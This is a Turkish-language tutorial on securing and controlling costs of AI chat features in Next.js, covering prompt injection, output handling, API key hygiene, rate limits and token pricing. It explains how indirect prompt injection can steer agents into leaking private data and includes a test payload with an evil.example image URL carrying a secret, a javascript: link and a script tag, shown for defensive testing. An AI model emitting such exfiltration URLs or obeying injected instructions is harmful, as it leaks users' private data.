---
title: "Güvenlik ve maliyet"
description: "Prompt injection, API anahtarı koruma, rate limit ve token maliyeti."
lastVerified: "2026-10-15"
translationKey: "ai/security-and-cost"
---

AI özelliği olan bir uygulamada iki şey sizi yakar: saldırgan modeli yönlendirir ya da fatura kontrolden çıkar. İkisi de aynı yerden başlar. Modelin önüne kimin ne koyabildiğini ve ne kadar kullanabildiğini sınırlamadınız. Bu rehberde dört konuyu sırayla göreceksiniz: prompt injection, API anahtarı koruma, rate limit ve token maliyeti. Örnekler [AI SDK ve Streaming Sohbet](/academy/ai/ai-sdk-and-streaming-chat) rehberindeki `/api/chat` route'undan gidiyor.

> [!NOTE]
>
> Bu rehberdeki kodlar `ai@7.0.140`, `next@16.4.1` ve `react-markdown@10.1.0` ile Node 22'de çalıştırıldı. Fiyatlar 15 Ekim 2026 itibarıyla Anthropic fiyat sayfasından alındı. Fiyatlar değişir, kodunuza gömmeden önce sayfaya bakın.[^1]

## Prompt injection

Prompt injection, modelin sizin talimatınızla başkasının yazdığı metni karıştırmasıdır. İki türü var. Doğrudan olanda kullanıcı kendi mesajıyla modeli yönlendirir. Dolaylı olanda talimat modelin okuduğu bir web sayfasında, e-postada, PDF'te ya da araç sonucunda saklıdır.[^2]

Asıl sorun şu: LLM'lerde talimat ile veri arasında bir sınır yok. İngiltere Ulusal Siber Güvenlik Merkezi (NCSC) bu yüzden prompt injection'ı SQL injection gibi düşünmemenizi söylüyor. SQL'de sorguyu parametreleştirip veriyi ayırabilirsiniz. Modelde böyle bir ayrım yok ve sorun hiç tam çözülmeyebilir.[^3] OWASP da kusursuz bir önlem olup olmadığının belirsiz olduğunu yazıyor.[^2]

Yani hedef "saldırıyı engellemek" olmamalı. Hedef, saldırı işe yarasa bile zararı küçük tutmak.

### Ölümcül üçlü

[Simon Willison](https://simonwillison.net), agent sistemlerinde tehlikeyi üç özelliğin birleşimi olarak tarif ediyor:[^4]

1. Özel verilere erişim
2. Güvenilmeyen içeriğe maruz kalma
3. Dışarıyla iletişim kurabilme (veri sızdırma yolu)

Üçü aynı agent'taysa saldırgan, okuduğu içeriğe yazdığı talimatla özel veriyi dışarı yollatabilir. [Willison](https://simonwillison.net)'ın önerisi bu üçlüyü bir arada vermemek. "Saldırıyı yakalarız" diyen guardrail ürünlerine de güvenmiyor.[^4]

Meta'nın "Agents Rule of Two" kuralı aynı fikri şöyle söylüyor. Bir agent oturumunda şu üç özellikten en fazla ikisi olsun:[^5]

- **A:** Güvenilmeyen girdi işlemek
- **B:** Hassas sisteme ya da özel veriye erişmek
- **C:** Durum değiştirmek ya da dışarıyla iletişim kurmak

Üçü de gerekiyorsa agent otonom çalışmamalı. İnsan onayı ya da başka güvenilir bir doğrulama şart.[^5]

> [!DO]
>
> Her araç eklerken üç soru sorun. Bu araç özel veri okuyor mu? Güvenilmeyen metin bu agent'a ulaşıyor mu? Dışarı bir şey gönderebiliyor mu? Üçüne de "evet" ise araçlardan birini çıkarın ya da onaya bağlayın.

### Etkiyi küçültmek

NCSC'nin önerileri somut: deterministik güvenlik önlemleri koyun, modele en az yetkiyi verin, her şeyi loglayın. "Prompt injection'ı durdurur" diyen ürünlere de temkinli olun. Yasaklı kelime listeleri işe yaramıyor.[^3] OWASP'ın listesi de aynı yönde: en az yetki, yüksek riskli işlemlerde insan onayı, güvenilmeyen içeriği ayırma ve saldırgan testleri.[^2]

AI SDK'da onay mekanizması hazır. İade, silme, e-posta gönderme gibi araçları `toolApproval` ile onaya bağlayın. Ayrıntısı [Tool Calling ve Structured Output](/academy/ai/tool-calling-and-structured-output) rehberinde.

```ts
// Yetkiyi araçta, sunucuda kontrol edin
cancelOrder: tool({
  description: 'Cancels the order',
  inputSchema: z.object({ orderId: z.string() }),
  execute: async ({ orderId }) => {
    const user = await requireUser(); // oturum, modelden gelmez
    return cancelOrderForUser(user.id, orderId); // sadece kendi siparişi
  },
}),
```

Model `orderId` olarak başkasının sipariş numarasını yollayabilir. Aracın sahiplik kontrolünü kendisi yapması bu yüzden şart. Modelin "bu kullanıcı yetkili" demesine güvenmeyin.

> [!WARNING]
>
> Sistem istemine "kullanıcı ne derse desin şunu yapma" yazmak güvenlik önlemi değildir. İstem, modele verilen bir öneridir. Yetki sınırını kodda çizin.

## Model çıktısına güvenmeyin

OWASP'ın "Improper Output Handling" maddesi modeli diğer kullanıcılar gibi görmenizi söylüyor. Çıktısı başka bir sisteme gitmeden önce doğrulayın ve kodlayın. Üretilen JavaScript ya da Markdown, tarayıcıda XSS'e yol açabilir. Önlem olarak bağlama uygun kodlama ve sıkı bir CSP öneriliyor.[^6]

Frontend'de en sık gözden kaçan yol Markdown görselleri. Model, özel veriyi bir görsel adresinin sorgu parametresine koyabilir. Sohbet arayüzü görseli yüklemeye çalıştığında veri saldırganın sunucusuna gider. [Johann Rehberger](https://embracethered.com)'in Google NotebookLM'de bulduğu açık tam olarak buydu. [Willison](https://simonwillison.net)'ın önerisi, Markdown görseli ve dış bağlantı gibi sızdırma yollarını kapatmak.[^7]

`react-markdown` ile şu deneme çalıştırıldı:

```tsx
import ReactMarkdown from 'react-markdown';
import { renderToStaticMarkup } from 'react-dom/server';

const hostile = `
![x](https://evil.example/c.png?d=GIZLI-SIPARIS-1042)

[Tıkla](javascript:alert(1))

<script>alert(1)</script>
`;

console.log(renderToStaticMarkup(<ReactMarkdown>{hostile}</ReactMarkdown>));
```

Varsayılan davranışta çıktı şöyle oldu:

- Görsel, `<img src="https://evil.example/c.png?d=GIZLI-SIPARIS-1042">` olarak render edildi. Yani veri adrese taşındı. Ayrıca bir `<link rel="preload" as="image">` etiketi de üretildi.
- `javascript:` bağlantısının adresi boşaltıldı (`href=""`).
- `<script>` ham HTML olarak çalışmadı, metin olarak kaçırıldı.

Yani `react-markdown` script ve `javascript:` tarafında güvenli, ama dış görsel sızdırma yolunu açık bırakıyor. Görseli kapatmak için `img` bileşenini boş döndürün:

```tsx
<ReactMarkdown components={{ img: () => null }}>{text}</ReactMarkdown>
```

Bu ayarla hem `<img>` hem de preload etiketi çıktıdan kalktı.

### CSP ikinci kat

Kodda bir şeyi unutursanız tarayıcı yakalasın. Aynı sayfa, `img-src` kısıtlayan bir CSP başlığıyla ve başlıksız olarak Chromium'da açıldı. Dış sunucuya giden görsel istekleri sayıldı:

| Sayfa | Dış sunucuya giden istek |
| --- | --- |
| CSP yok | 1 |
| `default-src 'self'; img-src 'self'` | 0 |

CSP varken tarayıcı görseli hiç istemedi, yani sorgudaki veri dışarı çıkmadı. Başlığı sunucunuzdan ya da barındırma ayarından ekleyebilirsiniz. Sunduğunuz görselleri ayrı bir alan adından veriyorsanız `img-src` listesine onu da ekleyin. CSP'nin nasıl yazılacağı ve nonce kullanımı [XSS ve CSP](/academy/auth-security/xss-and-csp) dersinde.

> [!DONT]
>
> Model çıktısını `dangerouslySetInnerHTML` ile basmayın. Markdown'ı da ham HTML'e çevirip basmayın. Render kütüphanesinin güvenli varsayılanlarını kapatmayın.

## API anahtarı koruma

Anahtarı tarayıcıya sızdırmanın en kolay yolu `NEXT_PUBLIC_` önekidir. Next.js dokümanına göre bu önekli değişkenler build sırasında tarayıcı paketine yazılır. Diğerleri yalnızca Node tarafında kalır.[^8]

İki sahte anahtarla `next build` çalıştırıldı: `NEXT_PUBLIC_FAKE_AI_KEY=sk-test-PUBLIC-1111` ve `FAKE_AI_KEY=sk-test-SERVER-2222`. Sonra build çıktısında iki değer de arandı:

| Anahtar | Bulunduğu dosya sayısı |
| --- | --- |
| `NEXT_PUBLIC_FAKE_AI_KEY` | `.next/static` içinde 1 |
| `FAKE_AI_KEY` | `.next` altında hiçbir yerde 0 |

Önekli anahtar herkesin indirdiği JavaScript'e girdi. Öneksiz olan hiçbir yerde yok.

> [!CAUTION]
>
> Hiçbir AI sağlayıcı anahtarına `NEXT_PUBLIC_` öneki koymayın. Öneki koyduğunuz an anahtar herkese açıktır. Anahtar sızdıysa sağlayıcı panelinden hemen iptal edin.

### Anahtarı tek yerde okuyun

Next.js'in veri güvenliği rehberi, `process.env`'i yalnızca bir veri erişim katmanında (DAL) okumayı öneriyor. Katmanın başına `import 'server-only'` koyarsanız dosya yanlışlıkla bir Client Component'tan içe aktarılırsa build hata verir.[^9]

```ts
// lib/ai.ts
import 'server-only';

export function getAiKey() {
  const key = process.env.AI_API_KEY;
  if (!key) throw new Error('AI_API_KEY is not set');
  return key;
}
```

Tarayıcı modele doğrudan gitmesin. Next.js'in Backend-for-Frontend rehberi de route handler'ları herkese açık uç nokta olarak görmenizi söylüyor. Yani `/api/chat`'i siz korumazsanız internetteki herkes çağırabilir.[^10]

### Anahtar hijyeni

Anthropic'in anahtar rehberi şunları öneriyor:[^11]

- Anahtarı koda gömmeyin. Ortam değişkeni ya da gizli bilgi yöneticisi kullanın.
- Düzenli döndürün (örnek olarak 90 günde bir).
- Ortam başına ayrı anahtar kullanın.
- Kullanım limiti koyun.
- Repoda gizli bilgi taraması çalıştırın (örnek olarak Gitleaks).
- Sızdığından şüphelenirseniz anahtarı hemen iptal edin.

Rehbere göre GitHub, sızan anahtarı Anthropic'e bildirir ve anahtar devre dışı kalır. Ama buna güvenmeyin, `.env` dosyasını `.gitignore`'a ekleyin.[^11]

Vercel AI Gateway kullanıyorsanız API anahtarına bütçe ve son kullanma tarihi verebilirsiniz.[^12]

## Rate limit

Rate limit iki yönde karşınıza çıkar. Biri sizin kullanıcılarınıza koyduğunuz sınır, diğeri sağlayıcının size koyduğu.

### Kendi tarafınız: kullanıcı başına sınır

OWASP "Unbounded Consumption" maddesinde kontrolsüz kullanımı "denial of wallet" yani cüzdana saldırı olarak anlatıyor. Önlemler: girdi boyutu sınırı, rate limit ve kullanıcı kotası, zaman aşımı ve izleme.[^13]

En basit rate limit, bellekte tutulan bir kayan pencere. Küçük bir deneme sunucusunda 1 saniyede 3 istek izni verildi. Aynı kullanıcıdan 5 istek, sonra başka bir kullanıcıdan 1 istek gönderildi:

```ts
const hits = new Map<string, number[]>();

function limit(id: string, max = 3, windowMs = 1000) {
  const now = Date.now();
  const recent = (hits.get(id) ?? []).filter((t) => now - t < windowMs);
  if (recent.length >= max) {
    hits.set(id, recent);
    return { success: false, retryAfter: Math.ceil((windowMs - (now - recent[0])) / 1000) };
  }
  recent.push(now);
  hits.set(id, recent);
  return { success: true };
}
```

Sonuç: ilk üç istek `200`, sonraki ikisi `429` ve `retry-after: 1` başlığıyla döndü. Başka kullanıcının isteği `200` aldı. Sınır kullanıcı başına çalışıyor.

> [!WARNING]
>
> Bu bellek içi sürüm yalnızca tek süreçte çalışır. Next.js dokümanına göre bazı barındırma ortamları handler'ları ayrı lambda'larda çalıştırır ve bunlar istekler arasında veri paylaşamaz.[^10] Canlıda sayacı dışarıda, örneğin Redis'te tutun.

Serverless için Upstash Ratelimit hazır bir çözüm. Bağlantısız (HTTP tabanlı) çalıştığı için serverless ortamlara uygun:[^14]

```ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '10 s'),
});

export async function POST(req: Request) {
  const user = await requireUser();
  const { success } = await ratelimit.limit(user.id);
  if (!success) return new Response('Too many requests', { status: 429 });
  // ... streamText
}
```

Next.js'in BFF rehberi de aynı akışı gösteriyor: sınırı aşan istek `429` alır. Rehber ayrıca barındırma tarafındaki rate limit'i de açmanızı öneriyor.[^10]

> [!TIP]
>
> Anonim kullanıcıda IP'ye göre, girişli kullanıcıda kullanıcı kimliğine göre sınırlayın. Pahalı modeller için ayrı, daha sıkı bir sınır koyun.

### Sağlayıcı tarafı: 429 ve yeniden deneme

Anthropic'in limitleri dakikadaki istek (RPM), girdi token'ı (ITPM) ve çıktı token'ı (OTPM) olarak model sınıfına göre ayrı. Sayaçlar token bucket mantığıyla sürekli dolar. Sınırı aşarsanız `429` gelir ve bazen `retry-after` başlığı eklenir. Yanıt başlıklarında `anthropic-ratelimit-*` ile kalan kota görünür.[^15]

İki ayrıntı maliyetle doğrudan ilgili:[^15]

- Çoğu modelde ITPM'e yalnızca önbellekten okunmayan girdi sayılır (`cache_read_input_tokens` sayılmaz). Prompt caching hem faturayı hem de limit baskısını düşürür.
- OTPM gerçek çıktıyı sayar. `max_tokens` değeri OTPM'i etkilemez.

Harcama limitine takılma durumu farklı. Bu `429` (`enforced_spend_limit_reached`) `retry-after` taşımaz ve yeniden denemek işe yaramaz.[^15]

AI SDK `429` gibi geçici hatalarda otomatik yeniden dener. `maxRetries` varsayılanı 2. Bu, sahte bir modelle denendi:

| Durum | Sonuç |
| --- | --- |
| İlk iki çağrı `429` (`isRetryable: true`), üçüncü başarılı | Toplam 3 çağrı, yanıt geldi |
| `maxRetries: 0` | 1 çağrı, `AI_APICallError` |
| Hep `429`, varsayılan ayar | 3 çağrı, `AI_RetryError` |

Yani varsayılanda bir kullanıcı isteği en fazla üç sağlayıcı çağrısına dönüşebilir. Kullanıcıya hızlı hata göstermek istiyorsanız `maxRetries`'i düşürün.

## Token maliyeti

### Neye ödüyorsunuz

Ücret üç kalemden oluşur: girdi token'ı, çıktı token'ı ve önbellek işlemleri. Çıktı genelde girdiden birkaç kat pahalı. Anthropic fiyat sayfasından 15 Ekim 2026 itibarıyla alınan 1 milyon token fiyatları:[^1]

| Model | Girdi | Çıktı | Önbellekten okuma |
| --- | --- | --- | --- |
| Haiku 5.5 | $0,10 | $0,50 | |
| Sonnet 5.5 | $2 | $10 | $0,10 |
| Opus 5.5 | $4 | $20 | $0,20 |
| Fable 5.1 / Mythos 5.1 | $10 | $50 | |

Haiku 5.5 fiyatı 100 bin token ve altındaki istemler için. Daha uzun istemlerde girdi $0,50, çıktı $2,50 oluyor. Batch API'de fiyatlar %50 düşüyor.[^1]

Aynı işi Haiku ile Sonnet arasında değiştirmek maliyeti kat kat oynatır. Kolay işleri (sınıflandırma, kısa özet) küçük modele verin, zor işleri büyüğe.

### Kullanımı ölçün

AI SDK her çağrının token kullanımını `usage` ve `totalUsage` ile veriyor. Çok adımlı çağrıda (araç kullanımı) `totalUsage` tüm adımların toplamıdır:

```ts
const result = await generateText({
  model,
  prompt: '...',
  maxOutputTokens: 256,
});

console.log(result.totalUsage);
```

Sahte bir modelle alınan örnek çıktı:

```json
{
  "inputTokens": 1000,
  "inputTokenDetails": { "noCacheTokens": 200, "cacheReadTokens": 700, "cacheWriteTokens": 100 },
  "outputTokens": 300,
  "outputTokenDetails": { "textTokens": 250, "reasoningTokens": 50 },
  "totalTokens": 1300
}
```

Bundan tahmini maliyet çıkaran küçük bir yardımcı yazabilirsiniz. Sonnet 5.5 fiyatlarıyla (girdi $2, çıktı $10, önbellek okuma $0,10, 5 dakikalık önbellek yazma $2,50):

```ts
const PRICE = { input: 2, output: 10, cacheRead: 0.1, cacheWrite: 2.5 }; // 1M token başına $

export function estimateCost(u: LanguageModelUsage) {
  const d = u.inputTokenDetails;
  return (
    ((d.noCacheTokens ?? 0) * PRICE.input +
      (d.cacheReadTokens ?? 0) * PRICE.cacheRead +
      (d.cacheWriteTokens ?? 0) * PRICE.cacheWrite +
      (u.outputTokens ?? 0) * PRICE.output) /
    1_000_000
  );
}
```

Yukarıdaki kullanım için sonuç 0,00372 dolar. Elle hesapla da aynı çıkıyor: 200×2 + 700×0,1 + 100×2,5 + 300×10 = 3.720, bunu 1 milyona bölün.

> [!NOTE]
>
> `reasoningTokens` çıktı tarafında ayrıca görünür. Düşünen modellerde fatura, ekranda gördüğünüz metinden büyük olabilir. Maliyeti `textTokens`'a değil `outputTokens`'a göre hesaplayın.

### Çıktıyı sınırlayın

`maxOutputTokens` en ucuz fren. Sahte modelde `maxOutputTokens: 256` değeri model çağrısına aynen ulaştı. Zaman aşımı ve iptal için `timeout` ile `abortSignal` var. `abortSignal` de aynı şekilde model çağrısına geçti. Kullanıcı sekmeyi kapatınca isteği iptal etmek, boşa üretilen token'ı keser.

```ts
const result = streamText({
  model: 'anthropic/claude-sonnet-5.5',
  messages: await convertToModelMessages(messages),
  maxOutputTokens: 1024,
  abortSignal: req.signal,
});
```

Girdi tarafında da sınır koyun. Mesaj sayısını ve toplam karakteri route'ta kontrol edin, uzun geçmişi kırpın ya da özetleyin. OWASP'ın girdi boyutu sınırı önerisi bu.[^13]

### Prompt caching

Tekrar eden uzun girdileri (sistem istemi, araç listesi, doküman) önbelleğe alabilirsiniz. Anthropic'e göre:[^16]

- Önbelleğe alınabilecek en kısa girdi, Opus 5.5, Sonnet 5.5, Haiku 5.5, Fable 5.1 ve Mythos 5.1 için 512 token.
- Varsayılan süre 5 dakika, isteğe bağlı 1 saat.
- Önbellek isabeti temel girdi fiyatının 0,1 katı. Opus 5.5 ve Sonnet 5.5'te 0,05 katı.
- Yazma 5 dakikalıkta 1,25 kat, 1 saatlikte 2 kat.
- Araçlarda, sistem isteminde ya da mesajlarda yaptığınız değişiklik, sonraki seviyelerin önbelleğini geçersiz kılar.

Yani sabit kısmı başa, değişen kısmı sona koyun. Sonnet 5.5'te okuma $0,10, normal girdi ise $2. Önbellek isabetinde aynı girdi, normal fiyatın yirmide biri kadar tutar.

AI SDK'da Anthropic için `providerOptions` ile açılır:[^17]

```ts
const result = await generateText({
  model: anthropic('claude-sonnet-5-5'),
  messages: [
    {
      role: 'system',
      content: longSystemPrompt,
      providerOptions: {
        anthropic: { cacheControl: { type: 'ephemeral' } }, // ttl: '1h' da verilebilir
      },
    },
    { role: 'user', content: question },
  ],
});

console.log(result.usage.inputTokenDetails.cacheReadTokens);
```

Önbelleğin tuttuğunu `cacheReadTokens` ve `cacheWriteTokens` değerlerinden görürsünüz. İlk çağrıda yazma, sonrakilerde okuma görmelisiniz.

> [!WARNING]
>
> `UIMessage` içinde `providerOptions` taşınmaz. `useChat` akışında önce `convertToModelMessages` ile model mesajlarına çevirin, `providerOptions`'ı çevrilmiş mesajlara siz ekleyin.[^17]

> [!NOTE]
>
> AI SDK'nın Anthropic sayfasında yazan "1024–4096 token" asgari uzunluğu, Anthropic'in güncel sayfasıyla uyuşmuyor. Güncel değer için Anthropic'in prompt caching sayfasına bakın.[^16]

### Gateway ile bütçe

Vercel AI Gateway kullanıyorsanız bütçeleri ekip, proje, API anahtarı ve kullanıcı seviyesinde verebilirsiniz. Bütçe aşılınca istek HTTP `402` ve `quota_for_entity_exceeded` ile reddedilir. İki ayrıntıya dikkat:[^12]

- Bütçe yumuşak bir sınırdır. Sınırı aşan isteğin kendisi tamamlanır.
- Kendi anahtarınızla (BYOK) yapılan harcama bütçeye sayılmaz.

İstek günlüklerinde token kullanımı ve maliyeti de görünür.[^12]

> [!TIP]
>
> Sağlayıcı panelinde de harcama limiti tanımlayın. Kodunuzdaki sınırlar çalışmasa bile fatura bir tavanda kalır. Ama bu limit dolunca `429` gelir ve uygulamanız durur. Alarmı limitin altına kurun.

## Kendin dene

1. Küçük bir Next.js projesinde `NEXT_PUBLIC_FAKE_KEY` ve `FAKE_KEY` tanımlayın. `next build` çalıştırıp `grep -r` ile iki değeri `.next` içinde arayın.
2. `react-markdown` ile içinde dış görsel olan bir metin basın. Ağ sekmesinde isteği görün, sonra `components={{ img: () => null }}` ekleyip tekrar bakın.
3. Sayfaya `img-src 'self'` içeren bir CSP başlığı ekleyin ve konsoldaki ihlal mesajına bakın.
4. `/api/chat` route'una kullanıcı başına rate limit ekleyin. `curl` ile döngüde isteyip `429` ve `retry-after` görün.
5. `result.totalUsage` değerini loglayın, `estimateCost` ile bir sohbetin maliyetini hesaplayın. Sonra sistem istemine `cacheControl` ekleyip `cacheReadTokens`'ın arttığını görün.

## Kaynaklar

1. [Anthropic: Pricing](https://platform.claude.com/docs/en/about-claude/pricing) *(doc)* — Model başına girdi, çıktı, önbellek ve batch fiyatları.
2. [OWASP: LLM01 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) *(doc)* — Doğrudan ve dolaylı prompt injection, etkiler ve azaltma yöntemleri.
3. [NCSC: Prompt injection is not SQL injection (it may be worse)](https://www.ncsc.gov.uk/blog-post/prompt-injection-is-not-sql-injection) *(article)* — Talimat ile veri arasında sınır olmaması ve etkiyi azaltma önerileri (8 Aralık 2025).
4. [Simon Willison: The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) *(article)* — Özel veri, güvenilmeyen içerik ve dışarıyla iletişimin birleşimi (16 Haziran 2025).
5. [Meta: Agents Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/) *(article)* — Agent oturumunda üç özellikten en fazla ikisini verme kuralı (31 Ekim 2025).
6. [OWASP: LLM05 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/) *(doc)* — Model çıktısına sıfır güven, kodlama ve CSP.
7. [Simon Willison: Google NotebookLM Data Exfiltration](https://simonwillison.net/2024/Apr/16/google-notebooklm-data-exfiltration/) *(article)* — Markdown görsel adresiyle veri sızdırma (16 Nisan 2024).
8. [Next.js: Environment Variables](https://nextjs.org/docs/app/guides/environment-variables) *(doc)* — `NEXT_PUBLIC_` önekinin tarayıcı paketine girmesi.
9. [Next.js: Data Security](https://nextjs.org/docs/app/guides/data-security) *(doc)* — Veri erişim katmanı ve `server-only`.
10. [Next.js: Backend for Frontend](https://nextjs.org/docs/app/guides/backend-for-frontend) *(doc)* — Route handler'lar, rate limit örneği ve barındırma sınırları.
11. [Anthropic: API key best practices](https://support.claude.com/en/articles/9767949-api-key-best-practices-keeping-your-keys-safe-and-secure) *(doc)* — Anahtarı saklama, döndürme, limit ve sızıntı durumu.
12. [Vercel: AI Gateway Budgets](https://vercel.com/docs/ai-gateway/observability-and-spend/budgets) *(doc)* — Bütçe kapsamları, `402` yanıtı ve yumuşak sınır.
13. [OWASP: LLM10 Unbounded Consumption](https://genai.owasp.org/llmrisk/llm102025-unbounded-consumption/) *(doc)* — Denial of wallet, girdi sınırı, rate limit ve kotalar.
14. [Upstash: Ratelimit (TypeScript)](https://upstash.com/docs/redis/sdks/ratelimit-ts/overview) *(doc)* — Kayan pencere ve serverless için bağlantısız rate limit.
15. [Anthropic: Rate limits](https://platform.claude.com/docs/en/api/rate-limits) *(doc)* — RPM, ITPM, OTPM, `429`, `retry-after` ve yanıt başlıkları.
16. [Anthropic: Prompt caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching) *(doc)* — Asgari uzunluk, süre, fiyat çarpanları ve geçersiz kılma.
17. [AI SDK: Anthropic provider](https://ai-sdk.dev/providers/ai-sdk-providers/anthropic) *(doc)* — `cacheControl` ve önbellek kullanım alanları.
